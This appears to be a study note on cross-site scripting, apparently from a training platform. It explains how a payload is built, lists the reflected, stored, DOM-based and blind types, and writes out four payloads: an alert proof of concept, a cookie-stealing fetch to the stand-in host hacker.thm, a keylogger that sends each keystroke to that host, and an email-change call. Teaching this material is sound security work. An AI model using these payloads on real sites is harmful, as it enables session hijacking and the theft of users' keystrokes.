## XSS Payloads
XSS payloads have two parts:
- the intention (what the attacker wants to do)
- the modification (modifying the payload so that it executes correctly in a scenic location on the page)

XSS Intentions:
- Proof of Concept  
  `<script>alert('XSS')</script>`
- Session Stealing  
  `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
- Key Logger  
  `<script>
document.onkeypress = function(e) {
fetch('https://hacker.thm/log?key=' + btoa(e.key));
}
</script>`
- Business Logic Attacks  
  `<script>user.changeEmail('attacker@hacker.thm');</script>`

Seeing how input is used in **Page Source** can help with perfecting the payload.  

Types of XSS:  
- **Reflected XSS** malicious input embedded in a URL can be immediately reflected by the application and executed in a victim’s browser.
- **Stored XSS** attacker-controlled input is saved on the server, such as in comments or user profiles, and later executed whenever other users view that content
- **DOM-Based XSS** occurs entirely on the client side when JavaScript improperly processes user-controlled data within the DOM, allowing attackers to inject and execute scripts without the server being directly involved.
- **Blind XSS** the attacker may not see the immediate result of their payload. Instead, the malicious script executes later in a different user’s browser, often an administrator reviewing logs, support tickets, or moderation panels.  
        

        
        
          
